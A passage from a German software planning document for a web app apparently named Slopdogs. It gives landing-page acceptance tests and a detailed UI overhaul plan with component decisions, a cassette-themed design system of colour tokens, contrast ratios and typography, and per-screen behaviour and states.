2. Given Server mit Seeds und Zaehlern; When `GET /`; Then Zustand `data`, jede Zeile verlinkt auf einen `url`-Wert, der mit `/k/` beginnt; Klick oeffnet den Kennel content-type-ehrlich.
3. Given frische DB (keine Zaehler, keine Sterne); When `GET /`; Then Zustand `empty`, keine Zahl auf der Seite ausser statischen Texten.
4. Given `GET /` mit `Accept-Language` beliebig; Then `lang="en"`, Zahlen im en-US-Format ("1,240", "4.3").
5. Given `curl -sI /`; Then `Cache-Control: public, max-age=300`, keine `Set-Cookie`-Header (Session-Middleware setzt nur bei Bedarf; pruefen).
6. Given Lighthouse mobil (Chrome DevTools, lokal); Then Performance >= 90, Accessibility >= 95 (Zielwerte, gesetzt); keine Anfrage an fremde Hosts im Netzwerk-Tab.
7. Given `DEBUG=prisma:query`; When `GET /`; Then keine Query.

**Abnahmekriterien (messbar).** Dateigroessen unter dem Budget (gemessen mit `Get-Item`/`gzip -c | wc -c`); Tests 1-7; `GET /robots.txt` 200 `text/plain`; SPA-Favicon zeigt das neue Symbol; `git grep -n "fonts.googleapis\|fonts.gstatic" public ui-app/src` = 0.

**Commit-Schnitt.**

1. `feat(landing): statische Landing unter /, robots.txt, Zustaende, /api/landing-Anbindung` — index.html, robots.txt, Font, README. Setzt die neue Vorlage voraus.
2. `feat(ui): Favicon nach Vorlage, Optik von kennel-stats-badge und kennel-rating` — nach der Vorlage; kein Diff in `kennel-list.component.scss`.
3. (nur falls die Vorlage `bg1` nutzt) vorher `merge fix/prisma-connection-pool` (Freigabe 10-0, 8.5).
4. `docs(mcp): Texte fuer P5` — 4.0 (Landing-Kennel in skill.md/README: `LANDING_KENNEL_ID`, `?look=`).

Look-Kopplung zur App: keine (8.20 entschieden — die App ist immer Mixtape, P6 6.2); die Landing bietet die vier Looks per `?look=`, die App uebernimmt nur Creme, Tinte, Orange, Teal aus `skin_c.js`. Kein `data-look`, kein localStorage-Look. Commit 2 (Favicon, Badge-Optik) entfaellt hier — Optik ist P6.

Abhaengigkeiten: 1 braucht P4 Commit 7 (`/api/landing`) und P3 Commit 5 (Haken); Landing-Kennel-Seed braucht P4b Commit 13 (`provenDogs`). Nichts in P5 blockiert P6; P7 Schritt 5 prueft die Landing.

### P6 — UI-Overhaul (Follie Revision 2 "Mixtape", U1-U8; Boreal UI-Bestand)

Quellen: Follie `follie_slopdogs_ui.md` **Revision 2** (auf 8.15-8.21 revidiert: App in der Mixtape-Welt, `/dogs`-Browser statt Detailseite, Void-Kino und Iris bleiben, Freeze, Pinning fremder run-only-Dogs) und Boreal `boreal_slopdogs_ui_mcp.md` A (Bestand mit Urteil je Bauteil). Lotus: die UI-Teile aus P3.5, P4, P4b, P4c werden hier gebaut; die Regel "kennel-list.component.scss nicht anfassen" endet hier. Follie nennt die Rechte-Phase weiterhin "P4d" — das ist P3.5 (W14); das Feld `frozen` gehoert zu P3.5 (3.5.3). Follies Hinweis, 8.13 sei "stale", ist erledigt (8.13 = Englisch, entschieden).

**Ziel.** Ein Designsystem statt drei (Boreal: Waves-Tokens nur in 6 Dateien, Courier-Chrome global `styles.scss:13`, `system-ui`-Inseln); die App als **Inlay-Karte und Deck** der Mixtape (Landing = Kassetten-Cover): dieselbe Creme, dieselbe Tinte, dasselbe Orange, aber nichts schreit; Tracklist-Zeilen statt Karten; ein `/dogs`-Browser mit Vorschau; die Flaechen aus P3.5/P4/P4b/P4c an ihrem Ort; tote und teure Bauteile raus; Englisch durchgehend (8.13).

#### 6.1 Bestand und Urteil (Boreal A.4, gezaehlt mit wc/grep auf 4b10138)

Kennzahlen: `ui-app/src` 16.439 Zeilen / 480.103 B in 98 Dateien; 38 Komponenten + 1 Direktive + 7 Services. Groesste: `vis-network.component.ts` 1.556 Z., `kennel-list.component.scss` 1.012 Z. (25.387 B), `waves-viewer.component.ts` 952 Z., `graph-layout.ts` 630 Z., `kennel-list.component.ts` 587 Z., `error-video-popup` 554 Z., `dog-toolbar` 457 Z. (tot).

| # | Bauteil | Urteil | Begruendung | Schritt |
|---|---|---|---|---|
| 1 | `pages/waves-viewer/_tokens.scss` (146 Z.) + `_primitives.scss` (271 Z.) | **hochziehen** nach `app/styles/` als globaler Token-Satz; Werte aus 6.2; Courier New aus `styles.scss` raus (Courier Prime kommt als Font, 8.23) | ein Designsystem statt drei (Boreal) | U1 |
| 2 | `components/dog-toolbar` (457 Z., 0 Importe), `components/floating-panel-window` (255 Z., 0 Importe) | **streichen** | 700+ Zeilen tote Last (gezaehlt) | U1 |
| 3 | `error-video-popup` (554 Z.) + `data/video-popup.ts` + `utils/youtube-embed.ts` + Iris im `loading-indicator` | **behalten und umstylen** (8.18 entschieden): `error-video-popup` -> `sd-void-cinema`; die Iris wandert von der Nebula auf die Nabe der linken Spule im `sd-veil`; Ausloeser nur noch Banner-Text (Fehler-Video) und Iris (Lade-Video) — Boreals Streich-Empfehlung ist verworfen, die 8 Ausloeser werden 2 | 10-0: "ich mag das eigentlich und easteregg kann drinne bleiben" | U1 |
| 4 | `kennel-scenic-parallax-backdrop` + `backdrop-drive.service` + `kennel-card-motion.directive` | **streichen** (keine Rotation, kein Marquee, keine Vignette in der Arbeitsflaeche, Follie 1.1) | 3,3 MB `bg1.png` auf diesem Branch; Scroll-Performance | U1 |
| 5 | `void-mythic-backdrop`, `void-requiem-glyph-watermark`, Nebula in `loading-indicator`; `requiem-loading.ts` | Backdrops, Wasserzeichen und Nebula **streichen**; die Verse (`pickRandomRequiemQuote`) **behalten** fuer Schleier und Login | Follie 1.3: Verse nur auf Schleier und Login | U1 |
| 6 | `app.routes`, `kennel-list.ts/html`, `kennel.service`, `waves-app-bar` | in P3 umgebaut (Pfade); in U2/U3 ersetzt | — | U2/U3 |
| 7 | `kennel-list.component.scss` (25.387 B, keine Tokens) | **neu schreiben** als `sd-track-row` (≤ 5 kB) + Seite (≤ 3 kB) + Skeleton (≤ 1 kB) — Follie 6.2: aus 25 kB werden 9 (gerechnet) | an der 24-kB-Grenze, nicht erweiterbar | U2 |
| 8 | `kennel-form` + `kennel-emoji-picker` | **umbauen**: Anlege-Sheet mit Segmentregel live; Emoji-Picker wird `sd-field`-Popover | P3 Regel; Follie 5 | U2 |
| 9 | `kennel-config` (Seite, 374/177/283 Z., 5x hartes `Courier New`) | **streichen als Seite**; Route `/kennels/:id/edit` rendert den Settings-Drawer 560 px ueber der Kennel-Seite (Follie 4.3/7.12; Lotus) | BACKLOG.md:20; Monaco-Body-Editor existiert im Viewer bereits | U6 |
| 10 | `acl-panel` (426 Z., `system-ui`) + `visibility-badge` + Side-Panel-Tab "Access" | **umbauen** auf drei Sichtbarkeitsstufen + Rollen owner/editor/reader/runner + Freeze (P3.5) | neues Rechtemodell | U6 |
| 11 | `kennel-stats-badge`, `kennel-rating`, `dog-proven-badge`, Side-Panel "Verwendung" | **neu** als `sd-plaque`, `sd-stars`, `sd-histogram`, `sd-proven-badge`, `sd-usage-list`, `sd-stat-tiles` | P4/P4b; budgetfrei (inline styles) | U2, U4, U5 |
| 12 | `waves-viewer`, `vis-network`, `graph-dog-node`, `waves-dog-palette`, `waves-inspector`, `waves-json-editor`, `waves-confirm-dialog` | **behalten**, Token-Migration; Canvas wird "ruled inlay" (`sd-wave-canvas`, `sd-dog-card`); Palette wird Tracklist (`sd-track-row` dog/palette) | groesstes und juengstes Stueck | U3, U4, U5 |
| 13 | `dog-side-panel` + 4 Artefakte + `dog-editor` + `version-timeline` | **behalten**, Monaco-Lazy aus 78ba628 (8.5), Monaco-Theme "inlay"; wird `sd-dog-inspector` | funktional vollstaendig | U5 |
| 14 | `auth-badge` (`system-ui`) | **umbauen** auf Tokens; Menue mit `Account` | SU-Insel | U1/U7 |
| 15 | Handkopien `utils/kennel-import-target.ts`, `utils/lead-result-string-format.ts` | **behalten** mit Kommentar; `config/kennel-reserved-names.ts` faellt in P3 | Vite-Subpfad-Grund | — |
| 16 | `icon-menu-fan`, `kennel-action-fan` (`share` ist `mobileOnly`, `kennel-action-fan.component.ts:34`) | **streichen**; Zeilenmenue `⋯` und Kachel-Kontextmenue ersetzen den Faecher | der Teilen-Knopf war auf Desktop unsichtbar | U2/U3 |

Fallen (Boreal): (a) `anyComponentStyle` 20/24 kB je Komponenten-Stylesheet (`angular.json:80-83`, Angular rechnet 1024); `src/styles.scss` faellt unter `initial` (500 kB/1 MB). (b) Monaco global in `index.html:10-16`; 78ba628 aendert 10 UI-Dateien — Merge vor P3 (8.5). (c) `@Input` und `input()` gemischt — auf Signals vereinheitlichen. (d) `angular.json:31-33 skipTests` — Sichttest je Schritt ist Handarbeit.

#### 6.2 Designrichtung und DESIGN.md (Follie Rev. 2, Kern woertlich; Datei `ui-app/DESIGN.md` wird in U1 angelegt)

Metapher: die Landing ist das Kassetten-Cover (grosse Bebas, harte Offset-Schatten, Marquee, kippende Cover); die App ist die **Inlay-Karte und das Deck** — das gefaltete Papier im Gehaeuse, auf dem jemand die Tracklist mit dem Label-Maker getippt und die Laufzeiten von Hand geschrieben hat, und die Maschine, die es abspielt. Was die App aus `skin_c.js` nimmt, und wie viel (Follie 1.1):

| Landing-Element (skin_c.js) | In der App | Dosis |
|---|---|---|
| Cream `#f0e6c8` / cream2 `#f7f0da`, Ink `#1b1712` | Seite, Flaechen, Text | ueberall |
| Tape-Orange `#ff6a00` | die eine Aktion: Primaerknopf, Fokusring, aktive Sortierung | max. zwei sichtbare Verwendungen je Screen |
| Inlay-Teal `#117f7f` | nur semantisch: live, ok, cached, "yours" | Statusworte und Fuellungen, nie Dekor |
| Bebas Neue | Chapter Cards und der Kennel-Name im Kennel-Kopf; sonst nichts | zwei Stellen |
| Courier Prime | UI-Body, Data, Labels, Code | ueberall (8.23) |
| Pirata One | das SD-Emblem in der Top-Bar, 28 px | eine Stelle |
| Label-Maker (`.lm`: Ink-Chip, Creme-Mono uppercase) | Status, Rolle, Sichtbarkeit, Wellen-Labels, frozen | die Badge-Sprache der App |
| Chapter Card (`.ct`: Ink-Band, "chapter 01", Bebas-Titel) | Seitenkoepfe `side A · kennels`, `side B · dogs`, Kennel-Kopf | eine je Seite |
| Tracklist (`.tracks`: Nummer, Titel, Laenge) | Kennel-Liste, Dog-Browser, Palette | die Listen-Sprache der App |
| 3 px Ink-Rahmen, `5px 5px 0` harte Schatten | 2 px am Seitenrahmen und an schwebenden Panels, harter Schatten `4px 4px 0` nur auf Drawern, Sheets, Dialogen; innen 1 px Haarlinien | heruntergedreht |
| Tape-Deck mit drehenden Spulen | Lauf-Indikator im Kennel-Kopf und auf dem Schleier | ein Motiv |
| Gedrehte Cover, Marquee, Vignette | nicht in der App | null |

Canvas-Grund (Entscheidung 8.22, Empfehlung A "ruled inlay"): Creme-Canvas mit 24-px-Punktraster in `rgba(27,23,18,.14)`; jede Welle ein Band (cream, cream2, cream …), getrennt durch eine 1 px gestrichelte Ink-Linie, links ein Label-Maker-Chip `wave 01`. Fremde run-only-Dogs und Silhouetten sind die einzigen Ink-gefuellten Karten — die schwarze Kassette zwischen den Papierkarten ist genau das, was man nicht oeffnen kann.

Underground, dosiert (Follie 1.3): Chapter Card oben auf jeder Seite; Label-Maker-Chips; die Spulen, die sich drehen, waehrend ein Kennel laeuft; ein Requiem-Vers auf Schleier und Login; das Void-Kino nach Klick auf ein Fehler-Banner und die Iris auf dem Schleier (8.18). Das ist die ganze Liste.

Palette (woertlich, Werte aus `skin_c.js`):

```css
:root {
  /* Neutrals, ~85 % jeder Flaeche. */
  --paper:         #f0e6c8;   /* Seite, Canvas */
  --paper-2:       #f7f0da;   /* Zeilen, Karten, Drawer, Eingaben, Editor */
  --paper-3:       #e6dbb8;   /* Hover-Zeile, aktiver Tab, gedrueckt */
  --ink:           #1b1712;   /* Text, Linien, Chips */
  --ink-2:         #5a5142;   /* Zweittext, Labels */
  --ink-3:         #9c917a;   /* Platzhalter, leere Sterne, nur Dekor */
  --line:          rgba(27,23,18,.18);
  --line-strong:   rgba(27,23,18,.40);
  --grid:          rgba(27,23,18,.14);   /* Canvas-Punkte */
  /* Accent, ~5 %. Eine Farbe: Tape-Orange. Immer nur Fuellung mit Ink darauf. */
  --accent:        #ff6a00;
  --accent-ink:    #1b1712;
  --accent-soft:   rgba(255,106,0,.16);
  /* Semantic, < 5 %. Teal heisst "live / ok / yours", nie Dekor. */
  --live:          #117f7f;
  --live-ink:      #0d6666;
  --live-soft:     rgba(17,127,127,.12);
  --warn-ink:      #8a5a00;
  --warn-soft:     rgba(138,90,0,.12);
  --danger-ink:    #b3261e;
  --danger-soft:   rgba(179,38,30,.12);
  --focus:         var(--accent);
}
[data-theme="dark"] { /* "Tape shell", nicht in v1 gebaut (8.24 = v2). Nur Overrides. */
  --paper: #2a241c; --paper-2: #332c22; --paper-3: #3d352a;
  --ink: #f0e6c8; --ink-2: #bfb595; --ink-3: #7d735f;
  --line: rgba(240,230,200,.16); --line-strong: rgba(240,230,200,.36); --grid: rgba(240,230,200,.12);
  --accent-soft: rgba(255,106,0,.22); --live-ink: #4fc1b8; --warn-ink: #e0a53a; --danger-ink: #ff7a70;
}
```

Kontraste (Follie: WCAG 2.x relative Luminanz, **von Hand gerechnet, gerundet — im Bau mit Werkzeug nachmessen**, R28):

| Paar | Verhaeltnis | Verwendung |
|---|---|---|
| `--ink` auf `--paper` | 14,3:1 | Fliesstext |
| `--ink` auf `--paper-2` | 15,6:1 | Text in Zeilen, Drawern, Editor |
| `--ink-2` auf `--paper` | 6,3:1 | Zweittext, Labels |
| `--ink-2` auf `--paper-2` | 6,9:1 | |
| `--ink-3` auf `--paper` | 2,5:1 | nur Dekor und Platzhalter, nie lesbarer Text |
| `--ink` auf `--accent` | 6,2:1 | Text auf Primaerknopf |
| `--accent` auf `--paper` | 2,3:1 | **faellt durch**: Orange ist nie Text auf Papier, nur Fuellung oder 3-px-Unterstrich |
| `--paper-2` auf `--live` | 4,2:1 | nur gross/fett: Teal-Chips tragen 11 px 700 uppercase mono = klein -> Teal-Chips mindestens 12 px 700, sonst `--live-soft` mit `--live-ink`-Text |
| `--live-ink` auf `--paper` | 5,4:1 | Statusworte als Text |
| `--warn-ink` auf `--paper` | 4,8:1 | |
| `--danger-ink` auf `--paper` | 5,3:1 | |
| `--paper` auf `--ink` | 14,3:1 | Label-Maker-Chips, Chapter Cards, Fremd-Dog-Karten |

Akzent-Budget je Screen: **zwei sichtbare Verwendungen** (Primaerknopf, Fokusring). Links sind Ink mit 1-px-Unterstrich `--line-strong`; aktive Sortierung ist ein Ink-Chip, nicht Orange. Sterne Ink-Konturen, `--ink-3` leer; Orange nur als Hover-Vorschau. Zaehler `--ink-2` Mono.

Typografie: Display **Bebas Neue** (400, uppercase) | Body/Mono **Courier Prime** (400, 700) | Emblem **Pirata One** (ein SVG in der Top-Bar). Alle self-hosted woff2 unter `ui-app/public/fonts/` mit OFL (wie P5). Courier Prime ist der einzige Textschnitt, keine Sans (8.23).

| Rolle | Groesse / Zeile | Schnitt | Tracking | Wo |
|---|---|---|---|---|
| Chapter | 40 / 36 Desktop, 28 / 26 Mobil | Bebas 400 | .03em | Chapter-Card-Titel `KENNELS`, `DOGS`, Kennel-Name im Kennel-Kopf |
| Chapter kicker | 11 / 14 | Courier 400 uppercase | .22em | `side A · 42 tracks`, `chapter 03` |
| H1 | 18 / 24 | Courier 700 | 0 | Drawer-/Dialog-Titel, Account-Abschnitte |
| H2 | 14 / 20 | Courier 700 uppercase | .06em | Abschnitte in Inspectoren und Formularen |
| Body | 14 / 21 | Courier 400 | 0 | alles |
| Small | 12 / 17 | Courier 400 | 0 | Meta-Zeilen, Hinweise |
| Label (Label-Maker) | 11 / 14 | Courier 700 uppercase | .16em | Chips: Status, Rolle, Sichtbarkeit, Welle, frozen |
| Data | 13 / 19 | Courier 400 `tabular-nums` | 0 | URLs, Zaehler, Zeiten, IDs |
| Code | 13 / 20 | Courier 400 | 0 | Monaco, JSON-Editor, Ergebnisse |

700 nur fuer H1, H2 und Label-Chips; Betonung im Fliesstext `--ink` gegen `--ink-2`, nie fett. Zeilenlaenge 64 Zeichen. Bebas genau zweimal je Seite.

Komponenten-Stil (Follie 2.4, Kurzform): Button primary Fuellung `--accent`, Text `--accent-ink`, 2 px `--ink` Rahmen, kein Radius, Hoehe 36/44, Courier 700 13 uppercase .06em, Hover `translate(-1px,-1px)` + Schatten `3px 3px 0 var(--ink)`; Button quiet transparent, 2 px `--ink`; Button ink (Fuellung `--ink`, Text `--paper`, nur in Chapter Cards und dunklen Drawer-Koepfen); Button danger 2 px `--danger-ink`, nie rot gefuellt; Icon-Button 36×36; Field Fuellung `--paper-2`, 2 px `--ink` nur unten (Schreibmaschinen-Linie), Fokus `outline 3px var(--focus)`; Row (Tracklist) Grid `44px 1fr auto`, min-height 56, 1 px `--line` unten, Hover `--paper-3`, "yours" mit `--live-soft`, keine Karte; Chip (Label-Maker) Fuellung `--ink`, Text `--paper`, Varianten `live` (Fuellung `--live`, 12 px 700), `soft` (`--paper-3`/`--ink-2`), `outline` (2 px `--ink`, aktiv = Ink-Fuellung); Chapter Card Fuellung `--ink`, Kicker + Bebas + rechts Data in `#bfb595`, sticky unter der Top-Bar; Drawer/Sheet `--paper-2`, 2 px `--ink`, harter Schatten `4px 4px 0 var(--ink)` (Desktop-Drawer links `-4px 4px 0`), Backdrop `rgba(27,23,18,.35)`, Sheet-Griff 40×4 Ink; Plaque `▷ 1 240 · 30d` Data `--ink-2`, Glyphe `--ink-3`; Stars Konturen 16 px Strich 1,5; Proven-Badge Chip `proven` in `--live`, `unproven` soft; Status-Chip mit Punkt (`● live` `--live`, `● running` Ink mit winziger drehender Spule, `● failed` `--danger-ink`-Fuellung, `● cold` `--warn-soft`, `● cached` soft); Frozen-Chip `--paper-3`/`--ink`, Text `frozen`, keine Glyphe; Tabs Label, aktiv 3 px `--ink` Unterstrich; Toast `--ink`-Fuellung, `--paper`-Text, 4 s; Loading veil Papier 92 %, 96-px-Tape-Deck-SVG mit zwei Spulen, ein Vers Small kursiv, ein 2 px Ink-Fortschrittsstrich, Iris = Nabe der linken Spule; **Monaco-Theme "inlay"**: Hintergrund `--paper-2`, Text `--ink`, Kommentare `--ink-3` kursiv, Keywords `--ink` 700, Strings `--live-ink`, Zahlen `--warn-ink`, Fehler `--danger-ink`, Zeilennummern `--ink-3`, aktuelle Zeile `--paper-3`, Selektion `--accent-soft`, Cursor `--ink` 2 px, Courier Prime 13/20, Ligaturen aus.

Layout: Spacing 4-pt `--s1 4 … --s8 64`; **keine Radius-Token** (Ecken eckig wie Papier); Gutter `clamp(16px, 4vw, 40px)`; Liste und Browser max 1120 px; Kennel-Seite randlos. Drei Ebenen: Grund (`--paper`, Punktraster, z 0), Blatt (`--paper-2`, 1 px `--line` oder 2 px `--ink`, z 1), Schwebend (Drawer/Sheet/Menue/Dialog/Toast: 2 px `--ink`, `4px 4px 0`, z 80/100/200). Keine weichen Schatten. Motion: `--ease-out cubic-bezier(.16,1,.3,1)`; `--ease-slam cubic-bezier(.22,1.5,.36,1)` fuer genau zwei Momente (Status-Chip bei Laufende, gesetzter Stern); `--dur-fast 120ms, --dur-base 200ms, --dur-slow 320ms`; Spulen `3s linear infinite` beim Lauf, Stopp mit 200 ms ease-out; Zeilen-Stagger 24 ms (Fade, 4 px Hub), max 12 Zeilen; `prefers-reduced-motion`: Spulen statisch, Stagger und Slam 0.01 ms, je Klasse, nie `*`. Breakpoints `sm 640, md 768, lg 1024, xl 1440`; Touch 44 px Mobil / 36 px Desktop; nichts hover-only.

Do: Chapter Card einmal je Seite; Label-Maker-Chips fuer jedes Zustandswort; Tracklist-Zeilen; Ink auf Orange, nie Orange auf Papier; Teal nur bei live/yours; harte Schatten nur auf schwebenden Panels; Verse auf Schleier und Login; frozen, run-only, private, pinned immer als Chip, nie als Farbe allein. Don't: gedrehte Karten, Marquee, Vignette, weiche Schatten, Radius; Emoji als Icons in Controls; gelbe Sterne; Fett im Fliesstext; Ausrufezeichen; zwei Akzente; Deutsch und Englisch gemischt.

Agent Prompt Guide (woertlich): "Mixtape inlay as a tool, not a poster. Page `#f0e6c8`, surfaces `#f7f0da`, ink `#1b1712`, hairlines `rgba(27,23,18,.18)`, square corners. One accent, tape orange `#ff6a00`, always with ink text on it, at most twice per screen (primary button, focus). Teal `#117f7f` only for live/ok/yours. Courier Prime 14/21 for all text, tabular numbers; Bebas Neue only on the chapter card and the kennel name. State words are ink label-maker chips (11 px 700 uppercase tracked .16em). Lists are tracklist rows: number, title, length. Hard `4px 4px 0` ink shadow on drawers and dialogs only, nothing else. Reels turn while a kennel runs. Copy in English, short, no exclamation marks."

#### 6.3 Informationsarchitektur (Follie Rev. 2, 3)

| # | Screen | Route | Wer | Kern |
|---|---|---|---|---|
| S1 | Kennels (side A) | `/kennels`, `?q=`, `?new=1`, `?mine=1`, `?sort=` | anon (ACL-Filter; run-only sichtbar 8.17) | finden, vergleichen nach Runs/Sternen, oeffnen, anlegen |
| S2 | Kennel-Seite (Viewer) | `/kennels/:id`, `?panel=brief\|versions\|rating\|stats\|access` | anon (redigierte Waves; run-only-Ansicht) | Wellen-Canvas, Inspector, Run, Public-URL, Sterne, Plakette, frozen-Zustand |
| S3 | Kennel-Einstellungen | `/kennels/:id/edit` (rendert als Drawer ueber S2) | canMutate, nicht frozen | Name, Beschreibung, Emoji, Sichtbarkeit, Personen, Freeze, Dog-Reihenfolge/Lead, Defaults |
| S4 | Dog-Palette | in S2, Drawer/Sheet | canMutate | Dogs finden, `proven` zuerst, fremde run-only-Dogs mit Pin, hinzufuegen, neuer Dog |
| S5 | Dog-Inspector | in S2, Drawer/Sheet | canRead fuer Code; jeder fuer Identitaet, Stats, Usage | code, context, result, parents, usage, stats, access |
| S6 | Dogs (side B, Browser) | `/dogs`, `?q=`, `?sort=proven\|calls30d\|reuse\|name`, `?group=`, `?pack=`, `?owner=`, `?dog=<lineageId>` | anon (ACL-Filter) | alle Dogs listen und browsen; ein Dog oeffnet nur als **Vorschau** (Desktop rechts, Mobil Sheet). **Kein `/dogs/:id`** (8.21). |
| S7 | Rating-Tab | S2 `?panel=rating` | anon sieht Aggregat, login bewertet | Sterne setzen/loeschen, Histogramm |
| S8 | Access | in S3 (Kennel) und S5 (Dog) | Owner (Superuser bei Community) | Sichtbarkeit drei Stufen, Personen mit Rollen, Freeze |
| S9 | Account | `/account`, Tabs profile · tokens · keys | login | Profil, PATs, Key-Store (P4c) |
| S10 | Login | `/login?returnTo=` | anon | ein Knopf, ein Vers |
| S11 | Schleier / Kaltstart | ueberall | alle | Spulen, Vers, ehrlicher Timer, Iris |

Nicht in der App: `/k/:id` und `/k/:id/docs` werden verlinkt, nie eingebettet (Ausnahme: HTML-Vorschau im Dog-Inspector "result", wie heute). Navigation Desktop: Top-Bar 56 px, Papier mit 2 px Ink-Linie darunter; links SD-Emblem (Pirata One 28 px) und Wortmarke `SLOPDOGS` in Bebas 20; dann zwei Label-Links `side A · kennels`, `side B · dogs` (aktiv = Ink-Chip); Mitte Suche (S1, S6); rechts `+ New`, Auth-Badge; auf S2 ersetzt der Kennel-Kopf die Top-Bar, `‹ kennels` zurueck. Mobil: Top-Bar 52 px ohne Side-Links; **Bottom-Bar** `Kennels · Dogs` auf S1/S6 (zwei Seiten, eine Kassette — das rechtfertigt jetzt eine Leiste); auf S2 `Dogs · Run · Inspect`; FAB `+` auf S1. Bottom-Sheets: Inspector, Palette, Dog-Vorschau, Sortierung, Filter, Settings; Snap 96 px / 50 % / 100 %; ein Sheet gleichzeitig. Drawer Desktop: Inspector rechts, Palette links, Dock ab 1440; `Esc` schliesst das oberste; `?panel=` oeffnet direkt. Sprache Englisch (8.13); Stimme kurz, Satzschreibung, keine Ausrufezeichen; Fehler benennen, was passiert ist.

#### 6.4 Schluessel-Screens — Verhalten und Zustaende (Follie Rev. 2, 4; Skizzen dort)

**S1 Kennels (side A).** Chapter Card `SIDE A · 42 TRACKS · 6 YOURS` / `KENNELS` / rechts `sorted by runs 30d`. Sortier-Chips `name · updated · runs 30d · stars` (outline, aktiv = Ink), `⇅`, `○ mine only`. Zeile = Tracklist: Nummer (Bebas 20, `--ink-3`), Emoji als Inhalt, Titel Bebas 20 uppercase, Chips nach dem Titel nur bei Nicht-Default (`run only`, `private`, `frozen`, `yours` als live-Chip), Data-Spalten rechts: Plakette (30 Tage), Sterne-Aggregat, relative Zeit (`title` mit Datum), `⏵` Icon-Button (oeffnet `/k/:id?<defaultQuery>` in neuem Tab; laeuft fuer jeden, 8.17). Zweite Zeile Small: `lineageId · n dogs · description`, eine Zeile, Ellipse. Zeile = Link zu S2; `⏵` und `⋯` (Hover; Mobil sichtbar) eigene Ziele; `⋯`: Open page, Docs, Copy link, Edit, Export, Delete. Mobil: zweizeilig, Sort/Filter als Sheet, Suche als Icon; `?q=` in der URL, Debounce 250 ms. Zustaende: Laden erste Seite = acht Skeleton-Zeilen (Haarlinien, zwei `--paper-3`-Balken; keine Spulen, kein Vers); Nachladen = Sentinel + `loading more …`; Kaltstart ab 3 s Schleier; Leer ungefiltert = `NO TRACKS YET.` (Bebas 28) / `Your AI writes the first one. Or start by hand.` / `[+ NEW KENNEL]` / Ink-Befehlsbox (`.cmd` der Landing auf 1 px gedreht) `claude mcp add --transport http slopdogs <origin>/mcp ⧉`; Leer gefiltert `Nothing matches "wett".` `[Clear search]`; Fehler = Banner `--danger-soft` mit 2 px `--danger-ink` Linie links `Couldn't load kennels (503).` `[Retry]` — Klick auf den Banner-Text oeffnet das Void-Kino (8.18); Anonym = `mine only` fehlt, `+ New` -> Login `returnTo=/kennels?new=1`; alter Server ohne `stats` = Plakette/Sterne nicht gerendert; `count 0` = `★ —` (`title="no ratings yet"`), `▷ 0` bleibt `0`; **Frozen** = Chip `frozen` nach dem Titel, `⋯` ohne Edit (Edit als `Frozen` disabled mit `Unfreeze in settings`). Sort: Zahlen `desc`, Name `asc` (P4 4.9); localStorage `slopdogs.kennelList.sort.v3`.

**S2 Kennel-Seite.** Kennel-Kopf = Chapter Card der Seite (Ink): Zeile 1 `‹ kennels`, Kicker `chapter 03 · 17 dogs · 3 waves`, Zustands-Chips rechts (`● live`, `frozen`, `run only`, `read only`, `v12 · 2026-09-20`); Zeile 2 Emoji, Name Bebas 40 (Papier auf Ink — die eine Stelle, an der der Kennel-Name Titel ist), Public-URL als Data mit `⧉` (kopiert absolute `/k/:id?<defaultQuery>`, Toast `Link copied.`), `docs`, Plakette, Sterne-Aggregat (Klick -> Tab rating), `[⏵ RUN]` Primaer (das einzige Orange im Kopf), `⋯` (Edit, Open page, Docs, Export, Versions, Freeze/Unfreeze fuer Owner, Delete); < 1100 px wandern URL und docs ins `⋯`. Canvas "ruled inlay" (8.22): Wellen-Chip links je Band, gestrichelte Ink-Linie zwischen Baendern; Dog-Karten 128×56 auf `--paper-2` mit 2 px Ink-Rahmen (Icon, Name Body, nach Lauf Data `812 ms` und Status-Punkt oben rechts); Lead-Karte mit `4px 4px 0`-Schatten und Chip `lead`; Kanten 1 px Ink 40 %, Hover 100 %; ausgewaehlte Karte 3 px Orange-Outline (zweite Akzentverwendung, nur solange gewaehlt). **Fremder run-only-Dog im eigenen Kennel** (8.15/8.17): **Ink-gefuellte Karte** (`--ink`/`--paper`), Name sichtbar (Follie 7.6: "you chose them"), Pack in Small, Chip `pinned v7`, Schloss-Glyphe vor dem Namen; Klick oeffnet den Dog-Inspector nur mit `result · parents · usage · stats` (kein `code`, kein `context`), Kopf `run only · owned by <name> · pinned to v7`; `Update pin` (quiet, nur fuer Kennel-Editoren) erscheint bei neuerer Version (`v9 available`). Inspector rechts 420: Label `KENNEL · RACE MAP`, Tabs `brief · versions · rating · stats · access`; Dog-Inspector ersetzt ihn im selben Drawer, `‹ kennel` zurueck. Mobil: Kopf 52 + 44 + Data-Zeile 32; Bottom-Bar `Dogs · [⏵ RUN] · Inspect`; Sheet-Peek 96 px mit Griff. Zustaende: Laden Config (Chapter Card mit Skeleton-Titel, Canvas leer mit Raster); Lauf laeuft (`[⏵ RUN]` wird `● running` mit drehendem Spulen-Punkt; Karten erscheinen Welle fuer Welle, bis Streaming kommt alle Wellen zugleich mit 40 ms Stagger je Band; `● live` landet mit `--ease-slam`, die Spulen stoppen — die Spitze der Motion-Kurve); Kaltstart ab 3 s Schleier ueber dem Canvas, Kopf bleibt; Leer (`NO DOGS YET.` / `Add one from the palette, or let your AI build the kennel over MCP.` / `[OPEN PALETTE]` / Befehlsbox); Fehler-Lauf (Banner `Run failed in wave 2: GeocodeLookup timed out.` `[Show dog]`; Karte mit `--danger-ink`-Punkt und 2 px danger-Rahmen; Banner-Text -> Void-Kino); 404/kein Zugriff (`THIS KENNEL ISN'T HERE.` / `It may be private, or the address has changed.` / `[BACK TO KENNELS]` `[Sign in]` — nie zwischen "gibt es nicht" und "darfst du nicht" unterscheiden); Reader ohne Edit (brief/query/body als Text, keine Felder, kein Save; Palette-Knopf fehlt; Karten nicht draggable; `⋯` ohne Edit/Delete; Chip `read only`); **Frozen** (Chip `frozen`; jedes Mutations-Control disabled mit `title="Frozen. Unfreeze in settings."`; Settings-Drawer read-only mit Banner `Frozen by <owner> on <date>. [Unfreeze]` nur Owner/Superuser; Runs, Ratings, Kopien unberuehrt — 8.25); alte Version (`v12 · 2026-09-20`, `[Back to latest]`, Save gesperrt); Dirty (Punkt am Tab, `[SAVE & RERUN]`, `Unsaved changes. Leave anyway?`).

